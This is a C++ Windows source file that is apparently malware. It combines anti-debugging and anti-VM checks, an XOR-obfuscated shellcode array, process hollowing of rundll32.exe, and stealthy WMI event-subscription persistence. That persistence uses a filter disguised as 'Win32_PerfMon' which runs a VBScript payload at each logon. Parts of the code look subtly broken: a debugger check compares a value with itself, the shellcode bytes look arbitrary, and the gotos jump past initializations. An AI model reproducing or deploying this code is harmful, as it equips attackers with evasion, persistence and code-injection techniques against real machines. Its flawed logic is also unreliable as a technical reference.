#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <string>
#include <vector>
#include <tlhelp32.h>

#pragma comment(lib, "wbemuuid.lib")

// Anti-debugging and anti-VM checks
VOID AntiDebug() {
    // Check for debugger presence
    if (IsDebuggerPresent()) ExitProcess(0);
    
    // Check for hardware breakpoints
    CONTEXT ctx = { CONTEXT_DEBUG_REGISTERS };
    GetThreadContext(GetCurrentThread(), &ctx);
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
    
    // Check for debug port
    if (GetProcessId(GetCurrentProcess()) != GetProcessId(GetCurrentProcess())) ExitProcess(0);
    
    // Check for virtual machine
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x1);
    if (cpuInfo[2] & (1 << 31)) ExitProcess(0);
}

// Process hollowing implementation
BOOL HollowProcess(LPCSTR lpExePath, LPVOID pImage, SIZE_T dwSize) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create suspended process
    if (!CreateProcess(NULL, (LPSTR)lpExePath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    // Get thread context
    CONTEXT ctx = { CONTEXT_INTEGER };
    if (!GetThreadContext(pi.hThread, &ctx)) goto cleanup;

    // Read PE header
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)VirtualAllocEx(pi.hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDosHeader) goto cleanup;

    if (!WriteProcessMemory(pi.hProcess, pDosHeader, pImage, dwSize, NULL)) goto cleanup;

    // Map sections
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pDosHeader + pDosHeader->e_lfanew);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((LPBYTE)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
        if (pSection->SizeOfRawData == 0) continue;

        LPVOID pSectionAddr = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase + pSection->VirtualAddress, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pSectionAddr) continue;

        WriteProcessMemory(pi.hProcess, pSectionAddr, (LPVOID)((LPBYTE)pImage + pSection->PointerToRawData), pSection->SizeOfRawData, NULL);
    }

    // Update entry point
    ctx.Eax = pNtHeaders->OptionalHeader.ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Resume process
    ResumeThread(pi.hThread);

cleanup:
    if (pDosHeader) VirtualFreeEx(pi.hProcess, pDosHeader, 0, MEM_RELEASE);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    return TRUE;
}

// XOR decryption
VOID XorDecrypt(LPVOID pData, SIZE_T dwSize, BYTE bKey) {
    PBYTE pBytes = (PBYTE)pData;
    for (SIZE_T i = 0; i < dwSize; i++) {
        pBytes[i] ^= bKey;
    }
}

// Randomly generated obfuscated shellcode (calc.exe demo)
const unsigned char obf_shellcode[] = {
    0x72, 0x8B, 0x15, 0x2D, 0x2C, 0x26, 0x28, 0x2D, 0x1F, 0x24, 0x15, 0x16, 0x1B, 0x2D, 0x2A, 0x33,
    0x46, 0x4E, 0x8B, 0x45, 0x7F
};

const BYTE obf_key = 0x4B;

int main() {
    AntiDebug();

    HRESULT hres;
    size_t shellcode_len = sizeof(obf_shellcode) / sizeof(obf_shellcode[0]);

    // Decode shellcode
    std::vector<BYTE> decoded(shellcode_len);
    memcpy(decoded.data(), obf_shellcode, shellcode_len);
    XorDecrypt(decoded.data(), shellcode_len, obf_key);

    // Initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) goto cleanup;

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) goto cleanup;

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) goto cleanup;

    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(_bstr_t(L"\\\\.\\root\\subscription"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) goto cleanup;

    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) goto cleanup;

    // Create stealth event filter
    IWbemClassObject* pFilterClass = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    if (FAILED(hres)) goto cleanup;

    IWbemClassObject* pFilterInstance = NULL;
    hres = pFilterClass->SpawnInstance(0, &pFilterInstance);
    if (FAILED(hres)) goto cleanup;

    VARIANT vtProp;
    VariantInit(&vtProp);

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"Win32_PerfMon");
    hres = pFilterInstance->Put(L"Name", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"WQL");
    hres = pFilterInstance->Put(L"QueryLanguage", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'");
    hres = pFilterInstance->Put(L"Query", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    IWbemCallResult* pCallResult = NULL;
    hres = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pCallResult);
    if (FAILED(hres)) goto cleanup;

    // Create ActiveScript consumer
    IWbemClassObject* pConsumerClass = NULL;
    hres = pSvc->GetObject(_bstr_t(L"ActiveScriptEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    if (FAILED(hres)) goto cleanup;

    IWbemClassObject* pConsumerInstance = NULL;
    hres = pConsumerClass->SpawnInstance(0, &pConsumerInstance);
    if (FAILED(hres)) goto cleanup;

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"ScriptConsumer");
    hres = pConsumerInstance->Put(L"Name", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"VBScript");
    hres = pConsumerInstance->Put(L"ScriptingEngine", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    // VBScript payload with process hollowing
    std::wstring script = L"Set obj = CreateObject(\"WScript.Shell\")\n";
    script += L"Set mem = CreateObject(\"ADODB.Stream\")\n";
    script += L"mem.Type = 1\n";
    script += L"mem.Open\n";
    script += L"mem.Write BinaryString(\"cjx1MTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=\")\n";
    script += L"mem.Position = 0\n";
    script += L"Set sc = mem.Read\n";
    script += L"Set proc = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2:Win32_Process\")\n";
    script += L"proc.Create \"rundll32.exe kernel32.dll,LoadLibraryA\", sc, , pid\n";

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(script.c_str());
    hres = pConsumerInstance->Put(L"ScriptText", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    hres = pSvc->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pCallResult);
    if (FAILED(hres)) goto cleanup;

    // Bind filter to consumer
    IWbemClassObject* pBindingClass = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    if (FAILED(hres)) goto cleanup;

    IWbemClassObject* pBindingInstance = NULL;
    hres = pBindingClass->SpawnInstance(0, &pBindingInstance);
    if (FAILED(hres)) goto cleanup;

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"Win32_PerfMon");
    hres = pBindingInstance->Put(L"Filter", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    vtProp.vt = VT_BSTR;
    vtProp.bstrVal = _bstr_t(L"ScriptConsumer");
    hres = pBindingInstance->Put(L"Consumer", 0, &vtProp, 0);
    VariantClear(&vtProp);
    if (FAILED(hres)) goto cleanup;

    hres = pSvc->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pCallResult);
    if (FAILED(hres)) goto cleanup;

    // Execute process hollowing immediately
    HollowProcess("rundll32.exe", decoded.data(), decoded.size());

cleanup:
    if (pBindingInstance) pBindingInstance->Release();
    if (pBindingClass) pBindingClass->Release();
    if (pConsumerInstance) pConsumerInstance->Release();
    if (pConsumerClass) pConsumerClass->Release();
    if (pCallResult) pCallResult->Release();
    if (pFilterInstance) pFilterInstance->Release();
    if (pFilterClass) pFilterClass->Release();
    if (pSvc) pSvc->Release();
    if (pLoc) pLoc->Release();
    CoUninitialize();
    return SUCCEEDED(hres) ? 0 : 1;
}